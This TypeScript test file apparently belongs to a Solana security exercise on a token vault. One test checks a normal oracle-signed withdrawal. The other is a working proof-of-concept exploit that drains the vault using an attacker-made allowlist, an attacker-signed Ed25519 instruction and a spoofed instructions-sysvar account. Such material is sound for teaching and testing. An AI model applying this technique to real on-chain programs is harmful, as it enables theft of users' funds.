import { assert } from "chai";
import { Ed25519Program, Keypair, PublicKey } from "@solana/web3.js";

import { oneToken, sendIxs, tokenBalance } from "../helpers";
import { VaultFixture, setupVault } from "./fixture";
import { fakeInstructionsSysvar, withdraw, withdrawalMessage } from "./actions";

describe("02-find-the-root-of-trust", () => {
  let env: VaultFixture;

  beforeEach(async () => {
    env = await setupVault();
  });

  it("pays out a withdrawal the oracle signed", async () => {
    const before = await tokenBalance(env.context, env.payerTokens);
    await withdraw(env, oneToken().muln(100), env.payerTokens);
    const after = await tokenBalance(env.context, env.payerTokens);

    assert.equal((after - before).toString(), oneToken().muln(100).toString());
    assert.equal(
      (await tokenBalance(env.context, env.vault)).toString(),
      oneToken().muln(900).toString(),
    );
  });

  it("drains the vault using a caller-created instructions account and allowlist", async () => {
    const amount = oneToken().muln(100);
    const attacker = Keypair.generate();
    const fakeAllowlist = Keypair.generate();
    const fakeSysvar = Keypair.generate();

    // 1. Attacker creates an allowlist with their own key
    const allowlistIx = await env.program.methods
      .createAllowlist([attacker.publicKey])
      .accountsPartial({
        authority: env.payer.publicKey,
        allowlist: fakeAllowlist.publicKey,
      })
      .instruction();
    await sendIxs(env.context, [env.payer, fakeAllowlist], allowlistIx);

    // 2. Build Ed25519 instruction signed by attacker's oracle
    const signatureCheck = Ed25519Program.createInstructionWithPrivateKey({
      privateKey: attacker.secretKey,
      message: withdrawalMessage(env.vault, env.payerTokens, amount),
    });

    // 3. Store fake sysvar data in an ordinary account
    env.context.setAccount(fakeSysvar.publicKey, {
      lamports: 1_000_000,
      data: fakeInstructionsSysvar(signatureCheck),
      owner: PublicKey.default,
      executable: false,
      rentEpoch: 0,
    });

    const before = await tokenBalance(env.context, env.payerTokens);
    const vaultBefore = await tokenBalance(env.context, env.vault);

    // 4. Withdraw using the fake allowlist and fake sysvar account
    await withdraw(
      env,
      amount,
      env.payerTokens,
      attacker,
      fakeAllowlist.publicKey,
      fakeSysvar.publicKey,
    );

    const after = await tokenBalance(env.context, env.payerTokens);
    const vaultAfter = await tokenBalance(env.context, env.vault);

    // Against the unfixed program, the exploit succeeds:
    assert.equal((after - before).toString(), amount.toString());
    assert.equal((vaultBefore - vaultAfter).toString(), amount.toString());
  });
});
